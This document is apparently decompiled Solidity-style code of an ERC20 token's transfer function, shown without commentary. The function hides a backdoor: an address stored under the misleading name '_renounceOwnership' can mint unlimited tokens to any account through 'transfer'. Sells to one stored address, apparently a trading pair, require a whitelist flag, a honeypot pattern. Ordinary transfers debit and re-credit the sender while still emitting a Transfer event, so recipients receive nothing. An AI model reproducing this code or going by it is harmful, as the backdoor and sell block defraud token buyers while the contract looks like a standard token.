function transfer(address varg0, uint256 varg1) public payable { 

    require(msg.data.length - 4 >= 64);

    require(varg0 == varg0);

    v0 = v1 = msg.sender == _renounceOwnership;

    if (v1) {

        v0 = 1 == stor_9_0_0;

    }

    if (!v0) {

        v2 = v3 = msg.sender == _renounceOwnership;

        if (v3) {

            v2 = !stor_9_0_0;

        }

        if (!v2) {

            require(msg.sender, Error('ERC20: transfer from the zero address'));

            require(varg0, Error('ERC20: transfer to the zero address'));

            if (stor_1_0_19 == varg0) {

                require(0xff & owner_3[msg.sender]);

            }

            require(_balanceOf[msg.sender] >= varg1, Error('ERC20: transfer amount exceeds balance'));

            v4 = _SafeSub(_balanceOf[msg.sender], varg1);

            _balanceOf[msg.sender] = v4;

            v5 = _SafeAdd(_balanceOf[msg.sender], varg1);

            _balanceOf[msg.sender] = v5;

            emit Transfer(msg.sender, varg0, varg1);

            v6 = v7 = 1;

        } else {

            v8 = 0xa40(varg1, _totalSupply);

            _totalSupply = v8;

            v9 = 0xa40(varg1, _balanceOf[varg0]);

            _balanceOf[varg0] = v9;

            emit Transfer(varg0, varg0, varg1);

            v6 = v10 = 1;

        }

    } else {

        require(msg.sender, Error('ERC20: transfer from the zero address'));

        require(varg0, Error('ERC20: transfer to the zero address'));

        if (stor_1_0_19 == varg0) {

            require(0xff & owner_3[msg.sender]);

        }

        require(_balanceOf[msg.sender] >= varg1, Error('ERC20: transfer amount exceeds balance'));

        v11 = _SafeSub(_balanceOf[msg.sender], varg1);

        _balanceOf[msg.sender] = v11;

        v12 = _SafeAdd(_balanceOf[msg.sender], varg1);

        _balanceOf[msg.sender] = v12;

        emit Transfer(msg.sender, varg0, varg1);

        stor_9_0_0 = 0;

        v6 = v13 = 1;

    }

    return v6;

}
